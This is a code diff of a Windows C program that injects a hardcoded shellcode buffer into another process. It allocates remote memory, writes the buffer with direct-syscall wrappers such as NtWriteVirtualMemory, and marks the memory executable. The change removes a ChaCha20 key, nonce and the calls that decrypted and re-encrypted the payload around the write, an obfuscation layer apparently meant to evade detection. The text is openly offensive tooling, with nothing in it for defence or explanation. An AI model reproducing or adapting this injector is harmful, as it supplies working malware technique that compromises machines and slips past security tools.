@@ -1,6 +1,5 @@
 #include "Syscalls.h"
 #include "Utils.h"
-#include "ChaCha20.h"
 #include <windows.h>
 #include <stdio.h>
 
@@ -37,8 +36,6 @@ BYTE buf[] =
 	"\x76\x08\x07\x9E\xAF\x8B\x76\x0F\x7B\xF3\x13\x06\x92\x81\xBF\x7B\xB9\x5D\x20\xCD\x1A\x3E\x3E\x31\x4D\x11\x27\x7F\xF0\xB6\xFD\xB4\x47\xED\x75"
 	"\x1B\x64\xCC\x5E\xFB\xF4\x10\x47\x6C\x2D\x47\xE1\xAF"
 };
-BYTE k[] = { "\x50\x43\x74\x65\x77\x66\x6e\x51\x70\x4f\x47\x4c\x34\x78\x64\x57\x62\x52\x38\x55\x63\x37\x69\x64\x51\x52\x51\x61\x56\x53\x58\x41" };
-BYTE n[] = { "\x49\xba\x12\x96\x89\xe2\x00\x00\x00\x00\xff\xaa" };
 
 static bool Init()
 {
@@ -62,9 +59,6 @@ static bool Init()
 
 int main()
 {
-	struct chacha20_context ctx;
-	chacha20_init_context(&ctx, k, n, 0);
-
 	HANDLE hProcess = NULL, hRemoteThread = NULL;
 	PVOID pRemoteAddr = NULL;
 	DWORD dwTgtProcId;
@@ -94,7 +88,6 @@ int main()
 	}
 	print_debug("[+] remote memory allocation succeded: %p\n", pRemoteAddr);
 
-	chacha20_xor(&ctx, buf, sizeof(buf));
 	
 	if (NtWriteVirtualMemory(hProcess, pRemoteAddr, buf, sizeof(buf), &bytesWritten) != STATUS_SUCCESS) {
 		print_debug("[-] NtWriteVirtualMemory failed\n");
@@ -102,8 +95,6 @@ int main()
 		goto Exit;
 	}
 	print_debug("[+] written %lld bytes\n", bytesWritten);
-
-	chacha20_xor(&ctx, buf, sizeof(buf));
 
 	if (NtProtectVirtualMemory(hProcess, &pRemoteAddr, &bufLen, PAGE_EXECUTE_READWRITE, &oldProtect) != STATUS_SUCCESS) {
 		print_debug("[-] NtProtectVirtualMemory failed\n");
